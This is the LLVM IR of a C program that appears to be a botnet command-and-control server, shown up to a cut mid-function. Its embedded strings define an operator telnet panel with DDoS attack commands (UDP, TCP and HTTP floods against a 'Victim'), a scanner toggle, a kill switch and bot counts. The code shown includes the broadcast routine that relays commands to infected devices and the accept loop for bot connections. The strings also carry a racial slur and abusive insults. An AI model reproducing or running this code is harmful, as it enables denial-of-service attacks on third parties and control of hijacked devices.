; ModuleID = 'server.c'
source_filename = "server.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-pc-linux-gnu"

%struct.clientdata_t = type { i32, i8 }
%struct.telnetdata_t = type { i32 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, %struct._IO_codecvt*, %struct._IO_wide_data*, %struct._IO_FILE*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type opaque
%struct._IO_codecvt = type opaque
%struct._IO_wide_data = type opaque
%struct.login_info = type { [20 x i8], [20 x i8] }
%struct.tm = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i64, i8* }
%struct.epoll_event = type <{ i32, %union.epoll_data }>
%union.epoll_data = type { i8* }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.in_addr = type { i32 }
%union.pthread_attr_t = type { i64, [48 x i8] }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }

@.str = private unnamed_addr constant [5 x i8] c"PING\00", align 1
@clients = dso_local global [1000000 x %struct.clientdata_t] zeroinitializer, align 16
@managements = dso_local global [1000000 x %struct.telnetdata_t] zeroinitializer, align 16
@.str.1 = private unnamed_addr constant [6 x i8] c"\1B[33m\00", align 1
@.str.2 = private unnamed_addr constant [3 x i8] c": \00", align 1
@.str.3 = private unnamed_addr constant [16 x i8] c"sent to fd: %d\0A\00", align 1
@.str.4 = private unnamed_addr constant [14 x i8] c"\0D\0A\1B[37mType: \00", align 1
@.str.5 = private unnamed_addr constant [2 x i8] c"\0A\00", align 1
@epollFD = internal global i32 0, align 4
@listenFD = internal global i32 0, align 4
@.str.6 = private unnamed_addr constant [7 x i8] c"accept\00", align 1
@.str.7 = private unnamed_addr constant [14 x i8] c"!* LOLNOGTFO\0A\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"epoll_ctl\00", align 1
@.str.9 = private unnamed_addr constant [15 x i8] c"!* SCANNER ON\0A\00", align 1
@.str.10 = private unnamed_addr constant [6 x i8] c"PONG\0A\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"REPORT \00", align 1
@telFD = internal global %struct._IO_FILE* null, align 8
@.str.12 = private unnamed_addr constant [4 x i8] c"%s\0A\00", align 1
@TELFound = internal global i32 0, align 4
@.str.13 = private unnamed_addr constant [8 x i8] c"PROBING\00", align 1
@scannerreport = internal global i32 0, align 4
@.str.14 = private unnamed_addr constant [15 x i8] c"REMOVING PROBE\00", align 1
@.str.15 = private unnamed_addr constant [5 x i8] c"PONG\00", align 1
@.str.16 = private unnamed_addr constant [11 x i8] c"buf: \22%s\22\0A\00", align 1
@.str.17 = private unnamed_addr constant [53 x i8] c"%c]0;Children : %d |DEATHCELL.NET| CIA Online : %d%c\00", align 1
@OperatorsConnected = internal global i32 0, align 4
@.str.18 = private unnamed_addr constant [10 x i8] c"login.txt\00", align 1
@.str.19 = private unnamed_addr constant [2 x i8] c"r\00", align 1
@.str.20 = private unnamed_addr constant [6 x i8] c"%s %s\00", align 1
@accounts = internal global [2 x %struct.login_info] zeroinitializer, align 16
@.str.21 = private unnamed_addr constant [31 x i8] c"\1B[36mWelcome,Username?: \1B[30m \00", align 1
@.str.22 = private unnamed_addr constant [3 x i8] c"%s\00", align 1
@.str.23 = private unnamed_addr constant [22 x i8] c"\1B[32mPassword: \1B[30m \00", align 1
@.str.24 = private unnamed_addr constant [5 x i8] c"\1B[1A\00", align 1
@.str.25 = private unnamed_addr constant [21 x i8] c"\1B[36mFUCK OFF SKID\0D\0A\00", align 1
@.str.26 = private unnamed_addr constant [48 x i8] c"\1B[31m   \09\09**     **              **          \0D\0A\00", align 1
@.str.27 = private unnamed_addr constant [48 x i8] c"\1B[32m  \09\09/**    /**             //           \0D\0A\00", align 1
@.str.28 = private unnamed_addr constant [48 x i8] c"\1B[33m  \09\09/**    /**   *******    **   **   **\0D\0A\00", align 1
@.str.29 = private unnamed_addr constant [48 x i8] c"\1B[34m  \09\09/**    /*   //**///**  /**  //** ** \0D\0A\00", align 1
@.str.30 = private unnamed_addr constant [48 x i8] c"\1B[35m  \09\09/**    /**   /**  /**  /**   //***  \0D\0A\00", align 1
@.str.31 = private unnamed_addr constant [48 x i8] c"\1B[36m  \09\09/**    /**   /**  /**  /**    **/** \0D\0A\00", align 1
@.str.32 = private unnamed_addr constant [48 x i8] c"\1B[37m  \09\09//*******    ***  /**  /**   ** //**\0D\0A\00", align 1
@.str.33 = private unnamed_addr constant [48 x i8] c"\1B[38m\09   \09///////    ///   //   //   //   // \0D\0A\00", align 1
@.str.34 = private unnamed_addr constant [51 x i8] c"\1B[38m~~~~~~~~~~~Welcome the The NET~~~~~~~~~~~~~\0D\0A\00", align 1
@.str.35 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.36 = private unnamed_addr constant [66 x i8] c"\1B[32m        #\1B[36m----- \1B[37mRouter Count: %d\1B[36m -----\1B[31m#\0D\0A\00", align 1
@.str.37 = private unnamed_addr constant [65 x i8] c"\0D\0A\1B[32m    #\1B[36m-------- \1B[37mWelcome, %s\1B[36m --------\1B[31m#\0D\0A\00", align 1
@.str.38 = private unnamed_addr constant [12 x i8] c"\1B[37mType: \00", align 1
@.str.39 = private unnamed_addr constant [5 x i8] c"BOTS\00", align 1
@.str.40 = private unnamed_addr constant [65 x i8] c"[+] - Slaves: [\1B[36m %d \1B[37m] [+] - Masters: [\1B[36m %d \1B[37m]\0D\0A\00", align 1
@.str.41 = private unnamed_addr constant [7 x i8] c"STATUS\00", align 1
@.str.42 = private unnamed_addr constant [65 x i8] c"[+] - Devices: [\1B[36m %d \1B[37m] [+] - Status: [\1B[36m %d \1B[37m]\0D\0A\00", align 1
@.str.43 = private unnamed_addr constant [5 x i8] c"HELP\00", align 1
@.str.44 = private unnamed_addr constant [43 x i8] c"   \0D\0A\1B[37m#--- \1B[36mCOMMANDS \1B[37m---#\0D\0A\0D\0A\00", align 1
@.str.45 = private unnamed_addr constant [55 x i8] c"   \1B[37m- UDP - \1B[36m!* UDP Victim Port Time 32 0 10\0D\0A\00", align 1
@.str.46 = private unnamed_addr constant [59 x i8] c"   \1B[37m- TCP - \1B[36m!* TCP Victim Port Time 32 all 0 10\0D\0A\00", align 1
@.str.47 = private unnamed_addr constant [41 x i8] c"   \1B[37m- HTTP - \1B[36m!* HTTP Url Time\0D\0A\00", align 1
@.str.48 = private unnamed_addr constant [43 x i8] c"   \1B[37m- CNC - \1B[36m!* CNC IP PORT TIME\0D\0A\00", align 1
@.str.49 = private unnamed_addr constant [35 x i8] c"   \1B[37m- IP - \1B[36m!* IP Victem\0D\0A\00", align 1
@.str.50 = private unnamed_addr constant [37 x i8] c"   \1B[37m- Kills Attack - \1B[36mKILL\0D\0A\00", align 1
@.str.51 = private unnamed_addr constant [34 x i8] c"   \1B[37m- Bot Count - \1B[36mBOTS\0D\0A\00", align 1
@.str.52 = private unnamed_addr constant [38 x i8] c"   \1B[37m- Clear Screen - \1B[36mCLEAR\0D\0A\00", align 1
@.str.53 = private unnamed_addr constant [33 x i8] c"   \1B[37m- LOGOUT - \1B[36mLOGOUT\0D\0A\00", align 1
@.str.54 = private unnamed_addr constant [27 x i8] c"   \1B[37m- TOS - \1B[36mTOS\0D\0A\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"   \0D\0A\00", align 1
@.str.56 = private unnamed_addr constant [3 x i8] c"ls\00", align 1
@.str.57 = private unnamed_addr constant [42 x i8] c"   \0D\0A\1B[37m#--- \1B[36mMETHODS \1B[37m---#\0D\0A\0D\0A\00", align 1
@.str.58 = private unnamed_addr constant [5 x i8] c"KILL\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"!* KILLATTK\0D\0A\00", align 1
@.str.60 = private unnamed_addr constant [6 x i8] c"CLEAR\00", align 1
@.str.61 = private unnamed_addr constant [11 x i8] c"\1B[2J\1B[1;1H\00", align 1
@.str.62 = private unnamed_addr constant [4 x i8] c"TOS\00", align 1
@.str.63 = private unnamed_addr constant [50 x i8] c"\0D\0A\1B[36mTOS: \1B[37mhttp://pastebin.com/HGHUJLE8\0D\0A\0D\0A\00", align 1
@.str.64 = private unnamed_addr constant [7 x i8] c"LOGOUT\00", align 1
@.str.65 = private unnamed_addr constant [8 x i8] c"Bye, %s\00", align 1
@.str.66 = private unnamed_addr constant [10 x i8] c"%s: \22%s\22\0A\00", align 1
@.str.67 = private unnamed_addr constant [11 x i8] c"server.log\00", align 1
@.str.68 = private unnamed_addr constant [2 x i8] c"a\00", align 1
@.str.69 = private unnamed_addr constant [9 x i8] c"%I:%M %p\00", align 1
@.str.70 = private unnamed_addr constant [13 x i8] c"[%s] %s: %s\0A\00", align 1
@.str.71 = private unnamed_addr constant [21 x i8] c"ERROR opening socket\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"ERROR on binding\00", align 1
@.str.73 = private unnamed_addr constant [16 x i8] c"ERROR on accept\00", align 1
@stderr = external global %struct._IO_FILE*, align 8
@.str.74 = private unnamed_addr constant [39 x i8] c"Usage: %s [port] [threads] [cnc-port]\0A\00", align 1
@.str.75 = private unnamed_addr constant [11 x i8] c"telnet.txt\00", align 1
@.str.76 = private unnamed_addr constant [3 x i8] c"a+\00", align 1
@.str.77 = private unnamed_addr constant [7 x i8] c"listen\00", align 1
@.str.78 = private unnamed_addr constant [13 x i8] c"epoll_create\00", align 1
@.str.79 = private unnamed_addr constant [7 x i8] c"NIGGER\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"fcntl\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"getaddrinfo: %s\0A\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"setsockopt\00", align 1
@.str.83 = private unnamed_addr constant [16 x i8] c"Could not bind\0A\00", align 1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @fdgets(i8* %0, i32 %1, i32 %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 1, i32* %8, align 4
  br label %9

9:                                                ; preds = %27, %3
  %10 = load i32, i32* %8, align 4
  %11 = icmp eq i32 %10, 1
  br i1 %11, label %12, label %25

12:                                               ; preds = %9
  %13 = load i32, i32* %7, align 4
  %14 = load i32, i32* %5, align 4
  %15 = icmp slt i32 %13, %14
  br i1 %15, label %16, label %25

16:                                               ; preds = %12
  %17 = load i8*, i8** %4, align 8
  %18 = load i32, i32* %7, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds i8, i8* %17, i64 %19
  %21 = getelementptr inbounds i8, i8* %20, i64 -1
  %22 = load i8, i8* %21, align 1
  %23 = zext i8 %22 to i32
  %24 = icmp ne i32 %23, 10
  br label %25

25:                                               ; preds = %16, %12, %9
  %26 = phi i1 [ false, %12 ], [ false, %9 ], [ %24, %16 ]
  br i1 %26, label %27, label %37

27:                                               ; preds = %25
  %28 = load i32, i32* %6, align 4
  %29 = load i8*, i8** %4, align 8
  %30 = load i32, i32* %7, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds i8, i8* %29, i64 %31
  %33 = call i64 @read(i32 %28, i8* %32, i64 1)
  %34 = trunc i64 %33 to i32
  store i32 %34, i32* %8, align 4
  %35 = load i32, i32* %7, align 4
  %36 = add nsw i32 %35, 1
  store i32 %36, i32* %7, align 4
  br label %9, !llvm.loop !6

37:                                               ; preds = %25
  %38 = load i32, i32* %8, align 4
  ret i32 %38
}

declare i64 @read(i32, i8*, i64) #1

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @trim(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %4, align 4
  %6 = load i8*, i8** %2, align 8
  %7 = call i64 @strlen(i8* %6) #8
  %8 = sub i64 %7, 1
  %9 = trunc i64 %8 to i32
  store i32 %9, i32* %5, align 4
  br label %10

10:                                               ; preds = %19, %1
  %11 = load i8*, i8** %2, align 8
  %12 = load i32, i32* %4, align 4
  %13 = sext i32 %12 to i64
  %14 = getelementptr inbounds i8, i8* %11, i64 %13
  %15 = load i8, i8* %14, align 1
  %16 = sext i8 %15 to i32
  %17 = call i32 @isspace(i32 %16) #8
  %18 = icmp ne i32 %17, 0
  br i1 %18, label %19, label %22

19:                                               ; preds = %10
  %20 = load i32, i32* %4, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %4, align 4
  br label %10, !llvm.loop !8

22:                                               ; preds = %10
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %5, align 4
  %25 = load i32, i32* %4, align 4
  %26 = icmp sge i32 %24, %25
  br i1 %26, label %27, label %36

27:                                               ; preds = %23
  %28 = load i8*, i8** %2, align 8
  %29 = load i32, i32* %5, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = call i32 @isspace(i32 %33) #8
  %35 = icmp ne i32 %34, 0
  br label %36

36:                                               ; preds = %27, %23
  %37 = phi i1 [ false, %23 ], [ %35, %27 ]
  br i1 %37, label %38, label %41

38:                                               ; preds = %36
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %39, -1
  store i32 %40, i32* %5, align 4
  br label %23, !llvm.loop !9

41:                                               ; preds = %36
  %42 = load i32, i32* %4, align 4
  store i32 %42, i32* %3, align 4
  br label %43

43:                                               ; preds = %59, %41
  %44 = load i32, i32* %3, align 4
  %45 = load i32, i32* %5, align 4
  %46 = icmp sle i32 %44, %45
  br i1 %46, label %47, label %62

47:                                               ; preds = %43
  %48 = load i8*, i8** %2, align 8
  %49 = load i32, i32* %3, align 4
  %50 = sext i32 %49 to i64
  %51 = getelementptr inbounds i8, i8* %48, i64 %50
  %52 = load i8, i8* %51, align 1
  %53 = load i8*, i8** %2, align 8
  %54 = load i32, i32* %3, align 4
  %55 = load i32, i32* %4, align 4
  %56 = sub nsw i32 %54, %55
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds i8, i8* %53, i64 %57
  store i8 %52, i8* %58, align 1
  br label %59

59:                                               ; preds = %47
  %60 = load i32, i32* %3, align 4
  %61 = add nsw i32 %60, 1
  store i32 %61, i32* %3, align 4
  br label %43, !llvm.loop !10

62:                                               ; preds = %43
  %63 = load i8*, i8** %2, align 8
  %64 = load i32, i32* %3, align 4
  %65 = load i32, i32* %4, align 4
  %66 = sub nsw i32 %64, %65
  %67 = sext i32 %66 to i64
  %68 = getelementptr inbounds i8, i8* %63, i64 %67
  store i8 0, i8* %68, align 1
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i64 @strlen(i8*) #2

; Function Attrs: nounwind readonly willreturn
declare i32 @isspace(i32) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local void @broadcast(i8* %0, i32 %1, i8* %2) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i64, align 8
  %10 = alloca %struct.tm*, align 8
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i8* %2, i8** %6, align 8
  store i32 1, i32* %7, align 4
  %13 = load i8*, i8** %4, align 8
  %14 = call i32 @strcmp(i8* %13, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0)) #8
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %16, label %17

16:                                               ; preds = %3
  store i32 0, i32* %7, align 4
  br label %17

17:                                               ; preds = %16, %3
  %18 = load i8*, i8** %4, align 8
  %19 = call i64 @strlen(i8* %18) #8
  %20 = add i64 %19, 10
  %21 = call noalias align 16 i8* @malloc(i64 %20) #9
  store i8* %21, i8** %8, align 8
  %22 = load i8*, i8** %8, align 8
  %23 = load i8*, i8** %4, align 8
  %24 = call i64 @strlen(i8* %23) #8
  %25 = add i64 %24, 10
  call void @llvm.memset.p0i8.i64(i8* align 1 %22, i8 0, i64 %25, i1 false)
  %26 = load i8*, i8** %8, align 8
  %27 = load i8*, i8** %4, align 8
  %28 = call i8* @strcpy(i8* %26, i8* %27) #9
  %29 = load i8*, i8** %8, align 8
  call void @trim(i8* %29)
  %30 = call i64 @time(i64* %9) #9
  %31 = call %struct.tm* @localtime(i64* %9) #9
  store %struct.tm* %31, %struct.tm** %10, align 8
  %32 = load %struct.tm*, %struct.tm** %10, align 8
  %33 = call i8* @asctime(%struct.tm* %32) #9
  store i8* %33, i8** %11, align 8
  %34 = load i8*, i8** %11, align 8
  call void @trim(i8* %34)
  store i32 0, i32* %12, align 4
  br label %35

35:                                               ; preds = %104, %17
  %36 = load i32, i32* %12, align 4
  %37 = icmp slt i32 %36, 1000000
  br i1 %37, label %38, label %107

38:                                               ; preds = %35
  %39 = load i32, i32* %12, align 4
  %40 = load i32, i32* %5, align 4
  %41 = icmp eq i32 %39, %40
  br i1 %41, label %59, label %42

42:                                               ; preds = %38
  %43 = load i32, i32* %12, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %44
  %46 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %45, i32 0, i32 1
  %47 = load i8, i8* %46, align 4
  %48 = icmp ne i8 %47, 0
  br i1 %48, label %60, label %49

49:                                               ; preds = %42
  %50 = load i32, i32* %7, align 4
  %51 = icmp eq i32 %50, 0
  br i1 %51, label %59, label %52

52:                                               ; preds = %49
  %53 = load i32, i32* %12, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %54
  %56 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %55, i32 0, i32 0
  %57 = load i32, i32* %56, align 4
  %58 = icmp ne i32 %57, 0
  br i1 %58, label %60, label %59

59:                                               ; preds = %52, %49, %38
  br label %104

60:                                               ; preds = %52, %42
  %61 = load i32, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %80

63:                                               ; preds = %60
  %64 = load i32, i32* %12, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %65
  %67 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %66, i32 0, i32 0
  %68 = load i32, i32* %67, align 4
  %69 = icmp ne i32 %68, 0
  br i1 %69, label %70, label %80

70:                                               ; preds = %63
  %71 = load i32, i32* %12, align 4
  %72 = call i64 @send(i32 %71, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.1, i64 0, i64 0), i64 5, i32 16384)
  %73 = load i32, i32* %12, align 4
  %74 = load i8*, i8** %6, align 8
  %75 = load i8*, i8** %6, align 8
  %76 = call i64 @strlen(i8* %75) #8
  %77 = call i64 @send(i32 %73, i8* %74, i64 %76, i32 16384)
  %78 = load i32, i32* %12, align 4
  %79 = call i64 @send(i32 %78, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.2, i64 0, i64 0), i64 2, i32 16384)
  br label %80

80:                                               ; preds = %70, %63, %60
  %81 = load i32, i32* %12, align 4
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.3, i64 0, i64 0), i32 %81)
  %83 = load i32, i32* %12, align 4
  %84 = load i8*, i8** %4, align 8
  %85 = load i8*, i8** %4, align 8
  %86 = call i64 @strlen(i8* %85) #8
  %87 = call i64 @send(i32 %83, i8* %84, i64 %86, i32 16384)
  %88 = load i32, i32* %7, align 4
  %89 = icmp ne i32 %88, 0
  br i1 %89, label %90, label %100

90:                                               ; preds = %80
  %91 = load i32, i32* %12, align 4
  %92 = sext i32 %91 to i64
  %93 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %92
  %94 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %93, i32 0, i32 0
  %95 = load i32, i32* %94, align 4
  %96 = icmp ne i32 %95, 0
  br i1 %96, label %97, label %100

97:                                               ; preds = %90
  %98 = load i32, i32* %12, align 4
  %99 = call i64 @send(i32 %98, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.4, i64 0, i64 0), i64 13, i32 16384)
  br label %103

100:                                              ; preds = %90, %80
  %101 = load i32, i32* %12, align 4
  %102 = call i64 @send(i32 %101, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.5, i64 0, i64 0), i64 1, i32 16384)
  br label %103

103:                                              ; preds = %100, %97
  br label %104

104:                                              ; preds = %103, %59
  %105 = load i32, i32* %12, align 4
  %106 = add nsw i32 %105, 1
  store i32 %106, i32* %12, align 4
  br label %35, !llvm.loop !11

107:                                              ; preds = %35
  %108 = load i8*, i8** %8, align 8
  call void @free(i8* %108) #9
  ret void
}

; Function Attrs: nounwind readonly willreturn
declare i32 @strcmp(i8*, i8*) #2

; Function Attrs: nounwind
declare noalias align 16 i8* @malloc(i64) #3

; Function Attrs: argmemonly nofree nounwind willreturn writeonly
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i1 immarg) #4

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind
declare i64 @time(i64*) #3

; Function Attrs: nounwind
declare %struct.tm* @localtime(i64*) #3

; Function Attrs: nounwind
declare i8* @asctime(%struct.tm*) #3

declare i64 @send(i32, i8*, i64, i32) #1

declare i32 @printf(i8*, ...) #1

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotEventLoop(i8* %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca %struct.epoll_event, align 1
  %4 = alloca %struct.epoll_event*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr, align 2
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca %struct.clientdata_t*, align 8
  %15 = alloca i32, align 4
  %16 = alloca i64, align 8
  %17 = alloca [2048 x i8], align 16
  %18 = alloca i8*, align 8
  %19 = alloca i8*, align 8
  %20 = alloca i8*, align 8
  store i8* %0, i8** %2, align 8
  %21 = call noalias align 16 i8* @calloc(i64 1000000, i64 12) #9
  %22 = bitcast i8* %21 to %struct.epoll_event*
  store %struct.epoll_event* %22, %struct.epoll_event** %4, align 8
  br label %23

23:                                               ; preds = %1, %297
  %24 = load volatile i32, i32* @epollFD, align 4
  %25 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %26 = call i32 @epoll_wait(i32 %24, %struct.epoll_event* %25, i32 1000000, i32 -1)
  store i32 %26, i32* %6, align 4
  store i32 0, i32* %7, align 4
  br label %27

27:                                               ; preds = %294, %23
  %28 = load i32, i32* %7, align 4
  %29 = load i32, i32* %6, align 4
  %30 = icmp slt i32 %28, %29
  br i1 %30, label %31, label %297

31:                                               ; preds = %27
  %32 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %33 = load i32, i32* %7, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %32, i64 %34
  %36 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %35, i32 0, i32 0
  %37 = load i32, i32* %36, align 1
  %38 = and i32 %37, 8
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %58, label %40

40:                                               ; preds = %31
  %41 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %41, i64 %43
  %45 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %44, i32 0, i32 0
  %46 = load i32, i32* %45, align 1
  %47 = and i32 %46, 16
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %58, label %49

49:                                               ; preds = %40
  %50 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %51 = load i32, i32* %7, align 4
  %52 = sext i32 %51 to i64
  %53 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %50, i64 %52
  %54 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %53, i32 0, i32 0
  %55 = load i32, i32* %54, align 1
  %56 = and i32 %55, 1
  %57 = icmp ne i32 %56, 0
  br i1 %57, label %77, label %58

58:                                               ; preds = %49, %40, %31
  %59 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %60 = load i32, i32* %7, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %59, i64 %61
  %63 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %62, i32 0, i32 1
  %64 = bitcast %union.epoll_data* %63 to i32*
  %65 = load i32, i32* %64, align 1
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %66
  %68 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %67, i32 0, i32 1
  store i8 0, i8* %68, align 4
  %69 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %70 = load i32, i32* %7, align 4
  %71 = sext i32 %70 to i64
  %72 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %69, i64 %71
  %73 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %72, i32 0, i32 1
  %74 = bitcast %union.epoll_data* %73 to i32*
  %75 = load i32, i32* %74, align 1
  %76 = call i32 @close(i32 %75)
  br label %294

77:                                               ; preds = %49
  %78 = load volatile i32, i32* @listenFD, align 4
  %79 = load %struct.epoll_event*, %struct.epoll_event** %4, align 8
  %80 = load i32, i32* %7, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %79, i64 %81
  %83 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %82, i32 0, i32 1
  %84 = bitcast %union.epoll_data* %83 to i32*
  %85 = load i32, i32* %84, align 1
  %86 = icmp eq i32 %78, %85
  br i1 %86, label %87, label %186

87:                                               ; preds = %77
  br label %88

88:                                               ; preds = %87, %151, %154, %178
  store i32 16, i32* %9, align 4
  %89 = load volatile i32, i32* @listenFD, align 4
  %90 = call i32 @accept(i32 %89, %struct.sockaddr* %8, i32* %9)
  store i32 %90, i32* %10, align 4
  %91 = load i32, i32* %10, align 4
  %92 = icmp eq i32 %91, -1
  br i1 %92, label %93, label %103

93:                                               ; preds = %88
  %94 = call i32* @__errno_location() #10
  %95 = load i32, i32* %94, align 4
  %96 = icmp eq i32 %95, 11
  br i1 %96, label %101, label %97

97:                                               ; preds = %93
  %98 = call i32* @__errno_location() #10
  %99 = load i32, i32* %98, align 4
  %100 = icmp eq i32 %99, 11
  br i1 %100, label %101, label %102

101:                                              ; preds = %97, %93
  br label %185

102:                                              ; preds = %97
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.6, i64 0, i64 0))
  br label %185

103:                                              ; preds = %88
  %104 = bitcast %struct.sockaddr* %8 to %struct.sockaddr_in*
  %105 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %104, i32 0, i32 2
  %106 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %105, i32 0, i32 0
  %107 = load i32, i32* %106, align 2
  %108 = load i32, i32* %10, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %109
  %111 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %110, i32 0, i32 0
  store i32 %107, i32* %111, align 8
  store i32 0, i32* %12, align 4
  store i32 0, i32* %11, align 4
  br label %112

112:                                              ; preds = %141, %103
  %113 = load i32, i32* %11, align 4
  %114 = icmp slt i32 %113, 1000000
  br i1 %114, label %115, label %144

115:                                              ; preds = %112
  %116 = load i32, i32* %11, align 4
  %117 = sext i32 %116 to i64
  %118 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %117
  %119 = getelementptr inbounds %struct.clientdata_t, %struct.clientdata_t* %118, i32 0, i32 1
  %120 = load i8, i8* %119, align 4
  %121 = icmp ne i8 %120, 0
  br i1 %121, label %122, label %126

122:                                              ; preds = %115
  %123 = load i32, i32* %11, align 4
  %124 = load i32, i32* %10, align 4
  %125 = icmp eq i32 %123, %124
  br i1 %125, label %126, label %127

126:                                              ; preds = %122, %115
  br label %141

127:                                              ; preds = %122
  %128 = load i32, i32* %11, align 4
  %129 = sext i32 %128 to i64
  %130 = getelementptr inbounds [1000000 x %struct.clientdata_t], [1000000 x %struct.clientdata_t]* @clients, i64 0, i64 %129
